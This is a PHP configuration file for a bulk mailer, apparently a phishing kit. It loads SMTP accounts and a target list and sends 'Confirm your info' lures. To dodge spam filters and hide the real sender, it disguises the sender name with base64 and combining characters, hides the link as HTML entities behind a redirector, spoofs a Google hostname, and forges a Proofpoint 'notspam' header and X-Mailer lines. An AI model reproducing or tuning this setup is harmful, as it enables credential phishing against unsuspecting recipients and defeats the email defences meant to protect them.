<?php
$timeset = 'Asia/Jakarta'; // reference for timezone http://php.net/manual/en/timezones.php


$smtp = 'smtp.csv';
$mailist = [
	'file'				=> 'list.txt',
	'removeduplicate'	=> false,
];

$sender_setting = [
	'color'				=> true,
	'Host'				=> 'smtp-relay.gmail.com', // smtp.gmail.com or smtp-relay.gmail.com
	'Port'				=> '587',
	'Hostname'			=> "mail-qv1-".rand(1,9999).".google.com", // You can modify this one as your hostname
	'max'				=> '1', // total of emails to send per sending
	'delay'				=> '0', // delay for send
	'charset'			=> 'UTF-8',
	'encoding'			=> 'quoted-printable', // quoted-printable or base64 or 7bit or 8bit
	'priority'			=> '3',	// 1=high, 3=normal, 5=low
	'randomparam'		=> false,
	'link'				=> 'https://&#108;&#46;&#119;&#108;&#46;&#99;&#111;&#47;&#108;&#63;&#117;&#61;&#104;&#116;&#116;&#112;&#115;&#58;&#47;&#47;&#113;&#114;&#99;&#111;&#46;&#100;&#101;&#47;&#48;&#98;&#81;&#81;&#115;&#103;&#118;&#78;&#108;&#86;&#68;&#105;&#88;&#56;&#111;&#120;&#107;&#84;&#115;&#100;&#97;&#101;&#52;&#117;&#77;&#100;&#49;&#57;&#73;&#69;&#119;&#109;&#113;&#106;&#100;&#119;&#53;&#97;', // input link here to use a random link fiture
	'header'			=> true,
];

$sender_inbox = [
	#--start--#
	[
		'fname' 				=> '=?UTF-8?B?Us2Pb82PYs2Pac2Pbs2PaM2Pb82Pb82PZM2P?=', // from name
		'fmail'					=> 'stuplexed@alestosei.com', //ganti ##domain## menjadi gmail.com jika nebar sbcglobal
		'subject' 				=> "=?UTF-8?B?Q29uZmlybSB5b3VyIGluZm8gYnkgU3VuZGF5LCBKdWx5IDE0LCAyMDI0Lg==?=",
		'attachfile'			=> '', // Your PDF File, leave it blank if you wont use it
		'attachname' 			=> "", // Custom your PDF File
		'letter'				=> 'Fresh.html',
		'alt'					=> 'Alt.html',

	],
	#--end--#


];

$sender_header = array(
	'X-Mailer: PHPMailer 6.1.5 (https://github.com/PHPMailer/PHPMailer)',
	'X-Mailer|WebService/1.1.17936 YMailNorrin Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.192 Safari/537.36',
	'X-Proofpoint-Spam-Details|rule=notspam policy=default score=1 suspectscore=0 malwarescore=0 phishscore=0 bulkscore=0 spamscore=1 clxscore=1011 mlxscore=1 mlxlogscore=212 adultscore=0 classifier=spam adjust=0 reason=mlx scancount=1 engine=8.0.1-2006250000 definitions=main-2103280179',
);




?>